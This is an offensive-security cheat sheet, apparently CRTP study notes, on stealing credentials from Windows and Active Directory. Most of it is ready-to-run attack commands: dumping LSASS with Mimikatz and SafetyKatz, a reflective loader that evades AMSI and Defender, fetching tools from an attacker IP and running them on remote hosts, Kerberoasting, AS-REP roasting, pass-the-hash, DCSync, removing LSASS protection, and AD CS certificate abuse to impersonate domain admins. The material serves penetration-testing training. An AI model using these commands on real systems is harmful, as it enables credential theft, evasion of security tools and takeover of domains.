# 06 — Credential Access & LSASS


> [!IMPORTANT]
> Gaining local administrative privileges on a machine allows extraction of credential material from the LSASS process memory, SAM registry hive, LSA secrets, or remotely via DCSync replication.

---

## LSASS & Credential Architecture

The **Local Security Authority Subsystem Service (LSASS)** (`lsass.exe`) manages local security policies and authenticates users.

LSASS holds active credential material in memory:
- Plaintext passwords (WDigest, SSP)
- NTLM hashes (`sekurlsa::msv`)
- Kerberos tickets & TGT session keys (`sekurlsa::tickets` / `sekurlsa::ekeys`)
- DPAPI Master Keys (`sekurlsa::dpapi`)

---

## LSASS Dumping Methods

> [!WARNING]
> Dumping LSASS via direct API calls or `procdump.exe` is heavily monitored by AV/EDR. Use obfuscated loaders or indirect memory dumping where required.

### Task Manager (GUI)
- Open Task Manager → Details tab → Right-click `lsass.exe` → **Create dump file**.
- Output saved to `C:\Users\<USER>\AppData\Local\Temp\lsass.dmp`.

### ProcDump (Sysinternals)
```cmd
procdump.exe -accepteula -ma lsass.exe C:\AD\Tools\lsass.dmp
```

### Parse Dump File Offline
```text
mimikatz # sekurlsa::minidump C:\AD\Tools\lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

---

## Mimikatz — Direct Execution

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

---

## SafetyKatz

> [!NOTE]
> **SafetyKatz** is a .NET wrapper around Mimikatz that creates a minidump of LSASS in memory using `MiniDumpWriteDump`, then runs a customised build of Mimikatz on the in-memory dump. It avoids dropping a full Mimikatz binary to disk, reducing AV/EDR detection surface.

### Direct Execution

```cmd
# Dump encryption keys (AES, NTLM, etc.) from LSASS
SafetyKatz.exe "sekurlsa::ekeys" "exit"

# Dump full logon credentials (passwords, hashes, tickets)
SafetyKatz.exe "sekurlsa::logonpasswords" "exit"

# Dump Kerberos tickets from memory
SafetyKatz.exe "sekurlsa::tickets" "exit"

# DCSync — replicate password hashes from a DC
SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt" "exit"
SafetyKatz.exe "lsadump::dcsync /user:<DOMAIN_SHORT>\Administrator" "exit"

# Dump LSA secrets and cached credentials
SafetyKatz.exe "lsadump::lsa /patch" "exit"

# Overpass-the-Hash — spawn a process with stolen credentials
SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe" "exit"
```

### Execution via Loader (AMSI & Defender Bypass)

> [!TIP]
> `Loader.exe` is a reflective PE loader that loads SafetyKatz entirely in memory without touching disk, bypassing AMSI and on-disk AV signatures.

```cmd
# Load SafetyKatz from local path and dump encryption keys
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::ekeys" "exit"

# Dump full logon credentials via Loader
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::logonpasswords" "exit"

# DCSync via Loader
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt" "exit"
```

### Download & Execute from Remote URL

```cmd
# Serve SafetyKatz via a web server and load directly into memory
C:\AD\Tools\Loader.exe -path http://<ATTACKER_IP>/SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
```

### Running on a Remote Machine via winrs / PSRemoting

```cmd
# Copy Loader to the target, then execute SafetyKatz remotely
echo F | xcopy C:\AD\Tools\Loader.exe \\<TARGET>\C$\Users\Public\Loader.exe /Y
winrs -r:<TARGET> C:\Users\Public\Loader.exe -path http://<ATTACKER_IP>/SafetyKatz.exe -args "sekurlsa::ekeys" "exit"
```

---

## Kerberoasting

Request TGS tickets for accounts with SPNs, then crack them offline.

### Enumerate Kerberoastable Accounts
```powershell
# PowerView
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### Rubeus
```cmd
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:<USER> /outfile:hashes.txt
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

### Impacket — GetUserSPNs
```bash
# Enumerate SPNs
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>

# Request TGS and dump crackable hashes
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile kerberoast.txt
```

### Crack with Hashcat
```bash
hashcat -m 13100 kerberoast.txt wordlist.txt
```

---

## AS-REP Roasting

Target accounts with Kerberos pre-authentication disabled — no password needed to request an AS-REP.

### Enumerate AS-REP Roastable Accounts
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

### Rubeus
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
Rubeus.exe asreproast /user:<USER> /format:hashcat /outfile:asrep.txt
```

### Impacket — GetNPUsers
```bash
# With credentials
impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile asrep.txt

# Without credentials (supply username list)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
```

### Crack with Hashcat
```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## Overpass-the-Hash (OPTH)

Requests a valid Kerberos TGT using an NTLM hash or AES key instead of a plaintext password.

### Mimikatz
```text
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256_KEY> /run:cmd.exe
```

### Rubeus
```cmd
# Standard TGT request & injection
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /ptt

# Opsec / Elevated NetOnly Process Spawn
Rubeus.exe asktgt /user:<USER> /aes256:<AES256_KEY> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Impacket — psexec / wmiexec with hash
```bash
impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<NTLM_HASH>
```

---

## DCSync Credential Replication

Uses Active Directory's Directory Replication Service (`MS-DRSR` / DRSUAPI) to request account secrets directly from a DC.

> [!IMPORTANT]
> **Prerequisites:** The account must hold:
> - `DS-Replication-Get-Changes`
> - `DS-Replication-Get-Changes-All`

### Mimikatz
```text
lsadump::dcsync /user:<DOMAIN_SHORT>\krbtgt
lsadump::dcsync /user:<DOMAIN_SHORT>\Administrator
```

### Impacket — secretsdump
```bash
# With password
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# With NTLM hash
impacket-secretsdump <DOMAIN>/<USER>@<DC_IP> -hashes :<NTLM_HASH>

# Dump only specific user
impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt
```

---

## LSASS Protected Process Light (PPL) Bypass

If LSASS is protected by LSA Protection (PPL), user-mode dumps will fail with `ACCESS DENIED`.

```text
mimikatz # privilege::debug
mimikatz # !drv::install C:\AD\Tools\mimidrv.sys
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

---

## Certificate-Based Credential Access (AD CS Abuse)

> [!IMPORTANT]
> Active Directory Certificate Services (AD CS) can be abused to obtain credentials (TGTs, NTLM hashes) for any domain user or computer — including Domain Admins — by requesting certificates with an attacker-controlled Subject Alternative Name (SAN). See also: [08-ADCS-PERSISTENCE.md](file:///d:/CRTP_Digital_Notes_GitHub_Notion/CRTP_Digital_Notes/github/08-ADCS-PERSISTENCE.md) for CA key extraction, ForgeCert, and persistence.

### Enumerate Vulnerable Templates

```cmd
# Certify — find all vulnerable templates (ESC1, ESC2, ESC3, etc.)
Certify.exe find /vulnerable

# Certify — enumerate templates on a specific CA
Certify.exe find /ca:<CA_HOST>\<CA_NAME>

# Certify — list all enabled certificate templates
Certify.exe find
```

```bash
# Certipy — enumerate and identify vulnerable templates
certipy find -u <USER>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -vulnerable
```

```powershell
# PSPKIAudit — PowerShell-based audit
. C:\AD\Tools\PSPKIAudit.ps1
Invoke-PKIAudit
```

### ESC1 — Enrollee Supplies Subject (SAN Control)

> [!NOTE]
> A template is ESC1-vulnerable when it has **Client Authentication EKU**, **ENROLLEE_SUPPLIES_SUBJECT** flag set, **no manager approval**, and **low-privileged enroll permission**.

```cmd
# Request a certificate as the current user, but set the SAN to a DA account
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:Administrator
```

```bash
# Certipy — request ESC1 certificate with attacker SAN
certipy req -u <USER>@<DOMAIN> -p <PASSWORD> -ca <CA_NAME> -target <CA_HOST> -template <TEMPLATE_NAME> -upn Administrator@<DOMAIN>
```

### ESC3 — Enrollment Agent Abuse

> [!NOTE]
> ESC3 abuses templates that grant **Certificate Request Agent** EKU. First, enroll in an agent template to get an enrollment agent certificate, then use it to request a certificate on behalf of any user.

```cmd
# Step 1: Request an Enrollment Agent certificate
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<AGENT_TEMPLATE>

# Step 2: Use the agent cert to request a certificate on behalf of a DA
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:<TARGET_TEMPLATE> /onbehalfof:<DOMAIN_SHORT>\Administrator /enrollcert:<AGENT_CERT.pfx> /enrollcertpw:<PFX_PASSWORD>
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

> [!NOTE]
> If the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled, **any** template with Client Authentication EKU can be abused like ESC1 — the SAN can be specified in the request regardless of template settings.

```cmd
# Request a cert from any Client Auth template with an arbitrary SAN
Certify.exe request /ca:<CA_HOST>\<CA_NAME> /template:User /altname:Administrator
```

### Convert PEM to PFX (if needed)

```bash
# Certipy outputs .pfx directly, but if you have separate cert + key:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### Request TGT Using Certificate (Rubeus)

```cmd
# Use the obtained .pfx certificate to request a TGT and inject it
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /ptt

# Request TGT with specific encryption type
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /domain:<DOMAIN> /dc:<DC_FQDN> /ptt

# Save to kirbi file instead of injecting
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /outfile:C:\AD\Tools\admin_tgt.kirbi /domain:<DOMAIN> /dc:<DC_FQDN>
```

```bash
# Certipy — request TGT using certificate (outputs .ccache)
certipy auth -pfx cert.pfx -dc-ip <DC_IP>
```

### UnPAC-the-Hash — Extract NTLM from Certificate Auth

> [!TIP]
> PKINIT (certificate-based Kerberos auth) returns a PAC containing the user's NTLM hash encrypted with the session key. **UnPAC-the-hash** extracts it, giving you the NTLM hash without ever touching LSASS.

```cmd
# Rubeus — request TGT and retrieve the NTLM hash via U2U
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\cert.pfx /password:<PFX_PASSWORD> /getcredentials /domain:<DOMAIN> /dc:<DC_FQDN> /show
```

```bash
# Certipy — authenticate and extract NTLM hash automatically
certipy auth -pfx cert.pfx -dc-ip <DC_IP>
# Output includes: [*] Got hash for 'Administrator@<DOMAIN>': aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
```

